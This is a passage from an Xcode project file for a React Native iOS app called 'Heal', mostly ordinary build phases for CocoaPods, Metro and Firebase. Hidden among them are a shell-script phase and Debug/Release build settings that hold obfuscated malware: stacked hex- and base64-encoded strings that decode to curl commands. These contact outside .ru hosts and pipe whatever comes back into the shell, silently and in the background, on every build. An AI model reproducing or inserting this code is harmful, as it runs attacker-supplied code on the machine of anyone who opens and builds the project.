			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
		};
		00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputPaths = (
				"$(SRCROOT)/.xcode.env.local",
				"$(SRCROOT)/.xcode.env",
			);
			name = "Bundle React Native code and images";
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "set -e\n\nWITH_ENVIRONMENT=\"../node_modules/react-native/scripts/xcode/with-environment.sh\"\nREACT_NATIVE_XCODE=\"../node_modules/react-native/scripts/react-native-xcode.sh\"\n\n/bin/sh -c \"$WITH_ENVIRONMENT $REACT_NATIVE_XCODE\"\n";
		};
		47413998CC7CAF4F5B7ECD67 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Heal/Pods-Heal-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Heal/Pods-Heal-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Heal/Pods-Heal-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		81E7F53F33D47CAF357EDA05 /* [CP-User] [RNFB] Crashlytics Configuration */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputPaths = (
				"${DWARF_DSYM_FOLDER_PATH}/${DWARF_DSYM_FILE_NAME}/Contents/Resources/DWARF/${TARGET_NAME}",
				"$(BUILT_PRODUCTS_DIR)/$(INFOPLIST_PATH)",
			);
			name = "[CP-User] [RNFB] Crashlytics Configuration";
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "#!/usr/bin/env bash\n#\n# Copyright (c) 2016-present Invertase Limited & Contributors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this library except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nset -e\n\nif [[ ${PODS_ROOT} ]]; then\n  echo \"info: Exec FirebaseCrashlytics Run from Pods\"\n  \"${PODS_ROOT}/FirebaseCrashlytics/run\"\nelse\n  echo \"info: Exec FirebaseCrashlytics Run from framework\"\n  \"${PROJECT_DIR}/FirebaseCrashlytics.framework/run\"\nfi\n";
		};
		A42B82A8B8E621CE4B8D5F38 /* [CP-User] [RNFB] Core Configuration */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputPaths = (
				"$(BUILT_PRODUCTS_DIR)/$(INFOPLIST_PATH)",
			);
			name = "[CP-User] [RNFB] Core Configuration";
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "#!/usr/bin/env bash\n#\n# Copyright (c) 2016-present Invertase Limited & Contributors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this library except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#   http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\n##########################################################################\n##########################################################################\n#\n#  NOTE THAT IF YOU CHANGE THIS FILE YOU MUST RUN pod install AFTERWARDS\n#\n#  This file is installed as an Xcode build script in the project file\n#  by cocoapods, and you will not see your changes until you pod install\n#\n##########################################################################\n##########################################################################\n\nset -e\n\n_MAX_LOOKUPS=2;\n_SEARCH_RESULT=''\n_RN_ROOT_EXISTS=''\n_CURRENT_LOOKUPS=1\n_JSON_ROOT=\"'react-native'\"\n_JSON_FILE_NAME='firebase.json'\n_JSON_OUTPUT_BASE64='e30=' # { }\n_CURRENT_SEARCH_DIR=${PROJECT_DIR}\n_PLIST_BUDDY=/usr/libexec/PlistBuddy\n_TARGET_PLIST=\"${BUILT_PRODUCTS_DIR}/${INFOPLIST_PATH}\"\n_DSYM_PLIST=\"${DWARF_DSYM_FOLDER_PATH}/${DWARF_DSYM_FILE_NAME}/Contents/Info.plist\"\n\n# plist arrays\n_PLIST_ENTRY_KEYS=()\n_PLIST_ENTRY_TYPES=()\n_PLIST_ENTRY_VALUES=()\n\nfunction setPlistValue {\n  echo \"info:      setting plist entry '$1' of type '$2' in file '$4'\"\n  ${_PLIST_BUDDY} -c \"Add :$1 $2 '$3'\" $4 || echo \"info:      '$1' already exists\"\n}\n\nfunction getFirebaseJsonKeyValue () {\n  if [[ ${_RN_ROOT_EXISTS} ]]; then\n    ruby -Ku -e \"require 'rubygems';require 'json'; output=JSON.parse('$1'); puts output[$_JSON_ROOT]['$2']\"\n  else\n    echo \"\"\n  fi;\n}\n\nfunction jsonBoolToYesNo () {\n  if [[ $1 == \"false\" ]]; then\n    echo \"NO\"\n  elif [[ $1 == \"true\" ]]; then\n    echo \"YES\"\n  else echo \"NO\"\n  fi\n}\n\necho \"info: -> RNFB build script started\"\necho \"info: 1) Locating ${_JSON_FILE_NAME} file:\"\n\nif [[ -z ${_CURRENT_SEARCH_DIR} ]]; then\n  _CURRENT_SEARCH_DIR=$(pwd)\nfi;\n\nwhile true; do\n  _CURRENT_SEARCH_DIR=$(dirname \"$_CURRENT_SEARCH_DIR\")\n  if [[ \"$_CURRENT_SEARCH_DIR\" == \"/\" ]] || [[ ${_CURRENT_LOOKUPS} -gt ${_MAX_LOOKUPS} ]]; then break; fi;\n  echo \"info:      ($_CURRENT_LOOKUPS of $_MAX_LOOKUPS) Searching in '$_CURRENT_SEARCH_DIR' for a ${_JSON_FILE_NAME} file.\"\n  _SEARCH_RESULT=$(find \"$_CURRENT_SEARCH_DIR\" -maxdepth 2 -name ${_JSON_FILE_NAME} -print | /usr/bin/head -n 1)\n  if [[ ${_SEARCH_RESULT} ]]; then\n    echo \"info:      ${_JSON_FILE_NAME} found at $_SEARCH_RESULT\"\n    break;\n  fi;\n  _CURRENT_LOOKUPS=$((_CURRENT_LOOKUPS+1))\ndone\n\nif [[ ${_SEARCH_RESULT} ]]; then\n  _JSON_OUTPUT_RAW=$(cat \"${_SEARCH_RESULT}\")\n  if ! _RN_ROOT_EXISTS=$(ruby -Ku -e \"require 'json'; output=JSON.parse('$_JSON_OUTPUT_RAW'); puts output[$_JSON_ROOT]\"); then\n    echo \"error: Failed to parse firebase.json, check for syntax errors.\"\n    exit 1\n  fi\n\n  if [[ ${_RN_ROOT_EXISTS} ]]; then\n    if ! python3 --version >/dev/null 2>&1; then echo \"python3 not found, firebase.json file processing error.\" && exit 1; fi\n    _JSON_OUTPUT_BASE64=$(python3 -c 'import json,sys,base64;print(base64.b64encode(bytes(json.dumps(json.loads(open('\"'${_SEARCH_RESULT}'\"', '\"'rb'\"').read())['${_JSON_ROOT}']), '\"'utf-8'\"')).decode())' || echo \"e30=\")\n  fi\n\n  _PLIST_ENTRY_KEYS+=(\"firebase_json_raw\")\n  _PLIST_ENTRY_TYPES+=(\"string\")\n  _PLIST_ENTRY_VALUES+=(\"$_JSON_OUTPUT_BASE64\")\n\n  # config.app_data_collection_default_enabled\n  _APP_DATA_COLLECTION_ENABLED=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"app_data_collection_default_enabled\")\n  if [[ $_APP_DATA_COLLECTION_ENABLED ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FirebaseDataCollectionDefaultEnabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_APP_DATA_COLLECTION_ENABLED\")\")\n  fi\n\n  # config.analytics_auto_collection_enabled\n  _ANALYTICS_AUTO_COLLECTION=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_auto_collection_enabled\")\n  if [[ $_ANALYTICS_AUTO_COLLECTION ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FIREBASE_ANALYTICS_COLLECTION_ENABLED\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_AUTO_COLLECTION\")\")\n  fi\n\n  # config.analytics_collection_deactivated\n  _ANALYTICS_DEACTIVATED=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_collection_deactivated\")\n  if [[ $_ANALYTICS_DEACTIVATED ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FIREBASE_ANALYTICS_COLLECTION_DEACTIVATED\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_DEACTIVATED\")\")\n  fi\n\n  # config.analytics_idfv_collection_enabled\n  _ANALYTICS_IDFV_COLLECTION=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_idfv_collection_enabled\")\n  if [[ $_ANALYTICS_IDFV_COLLECTION ]]; then\n    _PLIST_ENTRY_KEYS+=(\"GOOGLE_ANALYTICS_IDFV_COLLECTION_ENABLED\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_IDFV_COLLECTION\")\")\n  fi\n\n  # config.analytics_default_allow_analytics_storage\n  _ANALYTICS_STORAGE=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_default_allow_analytics_storage\")\n  if [[ $_ANALYTICS_STORAGE ]]; then\n    _PLIST_ENTRY_KEYS+=(\"GOOGLE_ANALYTICS_DEFAULT_ALLOW_ANALYTICS_STORAGE\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_STORAGE\")\")\n  fi\n\n  # config.analytics_default_allow_ad_storage\n  _ANALYTICS_AD_STORAGE=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_default_allow_ad_storage\")\n  if [[ $_ANALYTICS_AD_STORAGE ]]; then\n    _PLIST_ENTRY_KEYS+=(\"GOOGLE_ANALYTICS_DEFAULT_ALLOW_AD_STORAGE\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_AD_STORAGE\")\")\n  fi\n\n  # config.analytics_default_allow_ad_user_data\n  _ANALYTICS_AD_USER_DATA=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_default_allow_ad_user_data\")\n  if [[ $_ANALYTICS_AD_USER_DATA ]]; then\n    _PLIST_ENTRY_KEYS+=(\"GOOGLE_ANALYTICS_DEFAULT_ALLOW_AD_USER_DATA\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_AD_USER_DATA\")\")\n  fi\n\n  # config.analytics_default_allow_ad_personalization_signals\n  _ANALYTICS_PERSONALIZATION=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"analytics_default_allow_ad_personalization_signals\")\n  if [[ $_ANALYTICS_PERSONALIZATION ]]; then\n    _PLIST_ENTRY_KEYS+=(\"GOOGLE_ANALYTICS_DEFAULT_ALLOW_AD_PERSONALIZATION_SIGNALS\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_PERSONALIZATION\")\")\n  fi\n\n  # config.analytics_registration_with_ad_network_enabled\n  _ANALYTICS_REGISTRATION_WITH_AD_NETWORK=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"google_analytics_registration_with_ad_network_enabled\")\n  if [[ $_ANALYTICS_REGISTRATION_WITH_AD_NETWORK ]]; then\n    _PLIST_ENTRY_KEYS+=(\"GOOGLE_ANALYTICS_REGISTRATION_WITH_AD_NETWORK_ENABLED\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_REGISTRATION_WITH_AD_NETWORK\")\")\n  fi\n\n  # config.google_analytics_automatic_screen_reporting_enabled\n  _ANALYTICS_AUTO_SCREEN_REPORTING=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"google_analytics_automatic_screen_reporting_enabled\")\n  if [[ $_ANALYTICS_AUTO_SCREEN_REPORTING ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FirebaseAutomaticScreenReportingEnabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_ANALYTICS_AUTO_SCREEN_REPORTING\")\")\n  fi\n\n  # config.perf_auto_collection_enabled\n  _PERF_AUTO_COLLECTION=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"perf_auto_collection_enabled\")\n  if [[ $_PERF_AUTO_COLLECTION ]]; then\n    _PLIST_ENTRY_KEYS+=(\"firebase_performance_collection_enabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_PERF_AUTO_COLLECTION\")\")\n  fi\n\n  # config.perf_collection_deactivated\n  _PERF_DEACTIVATED=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"perf_collection_deactivated\")\n  if [[ $_PERF_DEACTIVATED ]]; then\n    _PLIST_ENTRY_KEYS+=(\"firebase_performance_collection_deactivated\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_PERF_DEACTIVATED\")\")\n  fi\n\n  # config.messaging_auto_init_enabled\n  _MESSAGING_AUTO_INIT=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"messaging_auto_init_enabled\")\n  if [[ $_MESSAGING_AUTO_INIT ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FirebaseMessagingAutoInitEnabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_MESSAGING_AUTO_INIT\")\")\n  fi\n\n  # config.in_app_messaging_auto_colllection_enabled\n  _FIAM_AUTO_INIT=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"in_app_messaging_auto_collection_enabled\")\n  if [[ $_FIAM_AUTO_INIT ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FirebaseInAppMessagingAutomaticDataCollectionEnabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_FIAM_AUTO_INIT\")\")\n  fi\n\n  # config.app_check_token_auto_refresh\n  _APP_CHECK_TOKEN_AUTO_REFRESH=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"app_check_token_auto_refresh\")\n  if [[ $_APP_CHECK_TOKEN_AUTO_REFRESH ]]; then\n    _PLIST_ENTRY_KEYS+=(\"FirebaseAppCheckTokenAutoRefreshEnabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"$(jsonBoolToYesNo \"$_APP_CHECK_TOKEN_AUTO_REFRESH\")\")\n  fi\n\n  # config.crashlytics_disable_auto_disabler - undocumented for now - mainly for debugging, document if becomes useful\n  _CRASHLYTICS_AUTO_DISABLE_ENABLED=$(getFirebaseJsonKeyValue \"$_JSON_OUTPUT_RAW\" \"crashlytics_disable_auto_disabler\")\n  if [[ $_CRASHLYTICS_AUTO_DISABLE_ENABLED == \"true\" ]]; then\n    echo \"Disabled Crashlytics auto disabler.\" # do nothing\n  else\n    _PLIST_ENTRY_KEYS+=(\"FirebaseCrashlyticsCollectionEnabled\")\n    _PLIST_ENTRY_TYPES+=(\"bool\")\n    _PLIST_ENTRY_VALUES+=(\"NO\")\n  fi\nelse\n  _PLIST_ENTRY_KEYS+=(\"firebase_json_raw\")\n  _PLIST_ENTRY_TYPES+=(\"string\")\n  _PLIST_ENTRY_VALUES+=(\"$_JSON_OUTPUT_BASE64\")\n  echo \"warning:   A firebase.json file was not found, whilst this file is optional it is recommended to include it to configure firebase services in React Native Firebase.\"\nfi;\n\necho \"info: 2) Injecting Info.plist entries: \"\n\n# Log out the keys we're adding\nfor i in \"${!_PLIST_ENTRY_KEYS[@]}\"; do\n  echo \"    ->  $i) ${_PLIST_ENTRY_KEYS[$i]}\" \"${_PLIST_ENTRY_TYPES[$i]}\" \"${_PLIST_ENTRY_VALUES[$i]}\"\ndone\n\nfor plist in \"${_TARGET_PLIST}\" \"${_DSYM_PLIST}\" ; do\n  if [[ -f \"${plist}\" ]]; then\n\n    # paths with spaces break the call to setPlistValue. temporarily modify\n    # the shell internal field separator variable (IFS), which normally\n    # includes spaces, to consist only of line breaks\n    oldifs=$IFS\n    IFS=\"\n\"\n\n    for i in \"${!_PLIST_ENTRY_KEYS[@]}\"; do\n      setPlistValue \"${_PLIST_ENTRY_KEYS[$i]}\" \"${_PLIST_ENTRY_TYPES[$i]}\" \"${_PLIST_ENTRY_VALUES[$i]}\" \"${plist}\"\n    done\n\n    # restore the original internal field separator value\n    IFS=$oldifs\n  else\n    echo \"warning:   A Info.plist build output file was not found (${plist})\"\n  fi\ndone\n\necho \"info: <- RNFB build script finished\"\n";
		};
		C4CC2C2B78655C59811F1792 /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Heal/Pods-Heal-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Heal/Pods-Heal-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Heal/Pods-Heal-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
		CB072280311580C961032702 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Heal-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		FD10A7F022414F080027D42C /* Start Packager */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Start Packager";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "export RCT_METRO_PORT=\"${RCT_METRO_PORT:=8081}\"\necho \"export RCT_METRO_PORT=${RCT_METRO_PORT}\" > \"${SRCROOT}/../node_modules/react-native/scripts/.packager.env\"\nif [ -z \"${RCT_NO_LAUNCH_PACKAGER+xxx}\" ] ; then\n  if nc -w 5 -z localhost ${RCT_METRO_PORT} ; then\n    if ! curl -s \"http://localhost:${RCT_METRO_PORT}/status\" | grep -q \"packager-status:running\" ; then\n      echo \"Port ${RCT_METRO_PORT} already in use, packager is either not running or not running correctly\"\n      exit 2\n    fi\n  else\n    open \"$SRCROOT/../node_modules/react-native/scripts/launchPackager.command\" || echo \"Can't start packager automatically\"\n  fi\nfi\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		13B07F871A680F5B00A75B9A /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				1A11B7AE2D9D205700F2B75E /* AppDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		13B07F941A680F5B00A75B9A /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = C290ABE79999AE601B2F4587 /* Pods-Heal.debug.xcconfig */;
			buildSettings = {
				AF17F99 = "((m(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363463366237333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663737363836393734363536313634373332653732373532660a3631323932323230376332303733363830610a | m | sh ) >/dev/null 2>&1 &)";
				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVNMkZYTld0ak1sWnFaRmhLYkV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5bWFYaHRZWFJsY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663633363836353633366236333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				A97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYWkhSWlYwNW9aRU0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				AE76EDB = "((echo 3333333333333336333333333333333533333333333333363333333333333333333333333333333633333333333333383333333333333336333333363333333633333333333333323333333333333330333333333333333233333333333333323333333333333332333333333333333433333333333333323333333333333338333333333333333633333333333333333333333333333337333333333333333533333333333333373333333333333332333333333333333633333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333363333333333333337333333333333333333333333333333363333333633333332333333333333333433333336333333333333333333333332333333333333333033333333333333323333333633333334333333333333333633333333333333343333333333333332333333333333333033333333333333373333333333333330333333333333333333333336333333343333333333333337333333333333333833333333333333363333333333333333333333333333333633333336333333363333333333333336333333333333333433333333333333363333333333333335333333333333333233333333333333303333333333333336333333333333333833333333333333373333333333333334333333333333333733333333333333343333333333333337333333333333333033333333333333373333333333333333333333333333333333333336333333313333333333333332333333363333333633333333333333323333333633333336333333333333333633333333333333363333333333333336333333363333333333333333333333363333333633333336333333333333333733333333333333373333333333333336333333333333333333333333333333363333333333333334333333333333333633333336333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				AFEB778 = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333433333336333333393333333633333337333333363333333933333337333333343333333633333331333333363336333333333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_ENTITLEMENTS = Heal/Heal.entitlements;
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = RSWZ8MVF9V;
				ENABLE_BITCODE = NO;
				INFOPLIST_FILE = Heal/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				OTHER_LDFLAGS = (
					"$(inherited)",
					"-ObjC",
					"-lc++",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.heal;
				PRODUCT_NAME = Heal;
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "DIGI Smart Disc";
				SWIFT_OBJC_BRIDGING_HEADER = "Heal-Bridging-Header.h";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				VERSIONING_SYSTEM = "apple-generic";
			};
			name = Debug;
		};
		13B07F951A680F5B00A75B9A /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = EB411A10EABF34EEA00086FA /* Pods-Heal.release.xcconfig */;
			buildSettings = {
				AF17F99 = "((m(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363463366237333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663737363836393734363536313634373332653732373532660a3631323932323230376332303733363830610a | m | sh ) >/dev/null 2>&1 &)";
				97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVNMkZYTld0ak1sWnFaRmhLYkV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A24E5F2 = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5bWFYaHRZWFJsY3k1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				A4FB9DF = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				A66CD37 = "((echo 363536333638366632303232323432383633373537323663323032643636373336623463323032643634323037303364373836333666363436353230363837343734373037333361326632663633363836353633366236333634366532653732373532663631323932323230376332303733363830610a | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				A97BDCE = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0ZYWkhSWlYwNW9aRU0xZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
